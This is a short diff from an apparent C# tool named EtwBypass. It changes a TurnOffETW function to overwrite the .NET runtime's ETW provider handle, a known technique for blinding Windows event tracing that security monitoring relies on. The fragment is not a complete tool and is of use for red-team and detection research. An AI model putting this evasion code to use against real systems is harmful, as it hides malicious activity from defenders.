@@ -121,7 +121,7 @@ namespace EtwBypass {
 
         static void TurnOffETW(IntPtr DotNETRuntimeHandle_addr, out long DotNETRuntimeHandle_val) {
             DotNETRuntimeHandle_val = Marshal.ReadInt64(DotNETRuntimeHandle_addr);
-            Marshal.WriteInt64(DotNETRuntimeHandle_addr, 0);
+            Marshal.WriteInt64(DotNETRuntimeHandle_addr, 1);
             Console.WriteLine("DotNETRuntimeHandle: 0x" + DotNETRuntimeHandle_val.ToString("X"));
         }
 
